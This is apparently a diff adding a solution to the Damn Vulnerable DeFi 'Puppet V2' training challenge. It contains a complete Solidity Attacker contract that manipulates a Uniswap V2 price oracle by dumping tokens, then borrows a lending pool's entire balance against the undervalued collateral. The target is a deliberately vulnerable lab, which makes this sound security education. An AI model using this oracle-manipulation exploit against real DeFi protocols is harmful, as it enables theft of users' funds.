@@ -98,7 +98,10 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        Attacker atk = new Attacker{value: PLAYER_INITIAL_ETH_BALANCE}(address(token), address(lendingPool), address(uniswapV2Exchange), address(uniswapV2Router), address(weth), recovery);
+        token.transfer(address(atk), PLAYER_INITIAL_TOKEN_BALANCE);      
+
+        atk.attack(9999e18);
     }
 
     /**
@@ -109,3 +112,89 @@ contract PuppetV2Challenge is Test {
         assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
 }
+
+contract Attacker {
+    
+    DamnValuableToken token;
+    address weth;
+    PuppetV2Pool lendingPool;
+    IUniswapV2Pair uniswapV2Exchange;
+    IUniswapV2Router02 uniswapV2Router;
+    address recovery;
+    constructor(address _token, address _lendingPool, address _uniswapV2Exchange, address _uniswapV2Router, address _weth, address _recovery) payable {
+        token = DamnValuableToken(_token);
+        lendingPool = PuppetV2Pool(_lendingPool);
+        uniswapV2Exchange = IUniswapV2Pair(_uniswapV2Exchange);
+        uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);
+        weth = _weth;
+        recovery = _recovery;
+    }
+
+    function attack(uint256 amount) external{
+        uint dvtbalance = token.balanceOf(address(this));
+
+        // Check balances: 
+        // 20 WETH 
+        // 10K DVT
+        console.log("Attacker balances:");
+        console.log("DVT: ", token.balanceOf(address(this)));
+        console.log("WETH: ", address(this).balance);
+        
+        uint collateralNeedBefore = lendingPool.calculateDepositOfWETHRequired(1_000_000e18);
+
+        // Needed ETH for draining lending Pool before attack:  300000000000000000000000
+
+        // we want to manipulate reserves, in order to make puppet pool calculate favourable quote
+
+        // uniswapV2Exchange pair: dvt, weth
+
+        
+        (uint112 reserve0, uint112 reserve1,) = uniswapV2Exchange.getReserves();
+        console.log("Reserves of Uniswap DVT/ETH Pool:");
+        console.log("ETH:", reserve0);
+        console.log("DVT:", reserve1);
+        // 10 ETH , 100 DVT
+
+        console.log(lendingPool.calculateDepositOfWETHRequired(100e18) / 3);
+        // 10.000000000000000000 the quote is 100 DVT = 10 ETH
+
+
+        // Swapping all DVT we can for ETH to drain ETH reserves
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        token.approve(address(uniswapV2Router), dvtbalance);
+        uniswapV2Router.swapExactTokensForETH(dvtbalance, 9e18, path, address(this), block.timestamp);
+
+
+        // Checking DVT/ETH reserves after swap
+        (reserve0, reserve1,) = uniswapV2Exchange.getReserves();
+
+        console.log("Reserves of Uniswap DVT/ETH Pool:");
+        console.log("ETH:", reserve0);
+        console.log("DVT:", reserve1);
+
+        /*console.log("Attacker balances:");
+        console.log("DVT: ", token.balanceOf(address(this)));
+        console.log("WETH: ", address(this).balance);*/
+        //   DVT Balance:  0
+        //  WETH Balance:  29900695134061569016
+
+        uint collateralNeedAfter = lendingPool.calculateDepositOfWETHRequired(1_000_000e18);
+        console.log("ETH Collateral for borrowing all 100k DTV before attack: ", collateralNeedBefore);
+        console.log("ETH Collateral for borrowing all 100k DTV after attack:  ", collateralNeedAfter);
+        // Needed ETH for draining lending Pool after attack:  29.496494833197321980
+
+
+        // Converting ETH to WETH and approve to usage to lending pool so we can borrow all 100k DVT
+        WETH(payable(weth)).deposit{value: address(this).balance}();
+        WETH(payable(weth)).approve(address(lendingPool), type(uint256).max);
+        
+        lendingPool.borrow(1_000_000e18);
+
+        token.transfer(recovery, token.balanceOf(address(this)));    
+    }
+    receive() external payable{}
+}
+
